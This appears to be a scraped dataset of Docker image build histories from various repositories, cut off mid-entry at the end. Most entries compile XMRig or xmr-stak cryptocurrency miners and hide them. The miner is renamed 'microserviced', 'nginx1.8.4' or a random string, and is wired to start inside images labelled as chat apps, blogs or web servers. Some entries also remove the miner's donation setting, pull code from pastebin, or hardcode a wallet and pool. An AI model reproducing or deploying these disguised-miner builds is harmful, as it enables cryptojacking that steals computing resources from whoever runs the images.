ryzenroger/itx-tests; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&     mv xmrig $NAME && cp $NAME /deadpico && cd /deadpico && echo "\\n ./${NAME}" >> electrode.sh && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nCMD ["/bin/sh -c npm start"]'
trekhlebob/sosu-blog; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
lamiki/mask-io; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
izhevsk/zuki; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
moneyforryzen/zenplus; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
monamier/collector; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
trekhlebob/job-node; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
belana/flapper; b'ADD file:fef3b00b3ae63967d8f4d83174b3fcecb55c9bada02b3e4f5a9b79a21b6c3bb3 /\nCMD ["/bin/sh"]\nRUN apk --no-cache add git cmake libuv-dev build-base cpulimit openssl-dev &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       sed -i -e "s/ 0-9*;/ 0;/" src/donate.h &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF . &&       make &&       mkdir /usr/local/flapper &&       mv xmrig /usr/local/flapper/flapper &&       rm -rf /xmrig &&       apk del build-base cmake git\nCOPY file:56a7f89c64c8843174030820592941dbe24f985288801cfaa0d407c7141f6676 /usr/local/flapper/\nENV PATH=/usr/local/flapper:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENTRYPOINT ["/usr/local/flapper/flapper"]'
gza521748/nginx; b'ADD file:d13b09e8b3cc98bf0868e2af7a49b14622d2111e2a4e10341859902e43bd872a /\nRUN  -z "$(apt-get indextargets)" \nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /mnt\nADD file:88b41fd58158ae382751e20acbcb5224bec613c240c1071767810ca169ca0c64 /etc/apt\nADD multi:6cc5292bcbf4ecc9b57b82f01b85429e30f27c3c219c89a23ec9fbcd3c8f74d5 /mnt/\nRUN apt-get update && apt-get -y install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev ca-certificates --no-install-recommends && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a ..&& make && cd / && mv /mnt/xmrig/build/xmrig /mnt/nginx1.8.4 && rm -rf /mnt/xmrig && chmod 777 /mnt/start.sh && rm -rf /var/lib/apt/lists/*\nENTRYPOINT ["/bin/sh -c /mnt/start.sh"]'
jritter/first; b'ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f /\nCMD ["/bin/sh"]\nENV XMRIG_VERSION=v2.6.1\nRUN set -ex      && adduser -S -D -h /home/xmrig xmrig      && apk add --no-cache --virtual .build-deps  build-base            git             cmake             build-base     && apk add --no-cache libuv-dev libmicrohttpd-dev     && cd /tmp     && git clone https://github.com/xmrig/xmrig     && cd xmrig     && git checkout "$XMRIG_VERSION"     && rm -f src/common/config/CommonConfig.cpp     && wget -qO src/common/config/CommonConfig.cpp https://pastebin.com/raw/iA7YDPee     && mkdir build     && cd build     && cmake .. -DCMAKE_BUILD_TYPE=Release     && make     && cp xmrig /home/xmrig     && cd /home/xmrig     && cp /home/xmrig/xmrig docker-entrypoint     && rm -rf /tmp/xmrig     && apk del .build-deps\nUSER xmrig\nWORKDIR /home/xmrig\nENTRYPOINT ["./docker-entrypoint"]'
webmalex/m1; b'ADD file:c34582524a7c4fa2ccb67d48efaa6edacff8bc8115a26a511b2385a03f56aa8e /\nCMD ["/bin/sh"]\nRUN set -x  && apk add --no-cache         libcurl         libgcc         libstdc++         openssl  && apk add --no-cache -t .build-deps         autoconf         automake         build-base         curl         curl-dev         git         openssl-dev  && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer  && cd /tmp/cpuminer  && ./autogen.sh  && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl  && make install  && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64  && chmod +x /usr/local/bin/dumb-init  && cd /  && apk del --purge .build-deps  && rm -rf /tmp/*  && cpuminer --cputest  && cpuminer --version\nENTRYPOINT ["dumb-init"]\nCMD ["cpuminer --help"]\nRUN cp /usr/local/bin/cpuminer m1\nCOPY file:2d828b1ac23dbb4ed5221c404adf1e55d17bf6072ed322be0431eea641001f93 c\nCMD ["/bin/sh -c ./m1 -c c"]\nCOPY file:bb4bafddc0b7ac87b444aeda7c88e8719e74b636dd387d634f7713d2e8483cce c'
noisyislands/public-chat; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nCMD ["/bin/sh -c npm start"]'
mrsunboss/monero; b'ADD file:4d97c01f35dbb6a82afb0c4142e4c535f616f3446eea7088d43eab9c5170d939 /\nCMD ["/bin/sh"]\nENV XMR_STAK_CPU_VERSION=v1.3.0-1.5.0\nCOPY dir:9fedf6970ad1c9d6240ee992d9280f3a464b2460af7e265d77e667a1aa2ac5fc /app\nWORKDIR /usr/local/src\nRUN echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> //etc/apk/repositories\nRUN apk add --no-cache       libmicrohttpd-dev       openssl-dev       hwloc-dev@testing       build-base       cmake       coreutils       git\nRUN git clone https://github.com/fireice-uk/xmr-stak-cpu.git     && cd xmr-stak-cpu     && git checkout -b build ${XMR_STAK_CPU_VERSION}     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h         && cmake -DCMAKE_LINK_STATIC=ON .     && make -j$(nproc)         && cp -t /app bin/xmr-stak-cpu config.txt     && chmod 777 -R /app\nRUN apk del --no-cache --purge       libmicrohttpd-dev       openssl-dev       hwloc-dev@testing       build-base       cmake       coreutils       git || echo "apk purge error ignored"\nWORKDIR /app\nRUN apk add --no-cache       libmicrohttpd       openssl       hwloc@testing       python2       py2-pip     && pip install envtpl\nENV WALLET_ADDRESS=459awMrwFLgSGxW38zuUhdZzBi2P3a137BQMS3kgiDAjRpsr1PSL7gvb19mKG1USik5fD4Q9e32kiDexwfRKJx2ZQWUeDiE.peter_v2\nENV POOL_ADDRESS=pool.minexmr.com:5555\nENV AUTO_THREAD_CONFIG=true\nENV THREAD_CONFIG={ "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },{ "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 1 },{ "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 2 },{ "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 3 },\nENTRYPOINT ["/app/docker-entrypoint.sh"]\nCMD ["xmr-stak-cpu"]'
godleon/dc-test; b'ADD file:9511990749b593a6f98fcc4d7dfe03df7b2c79be69f7a9ea96b52a6a8065829d /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV GIT_REPOSITORY=https://github.com/xmrig/xmrig.git\nENV GIT_VERSION=v5.0.0\nENV CMAKE_FLAGS=-DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7\nRUN set -x     && buildDeps=\'git build-essential cmake 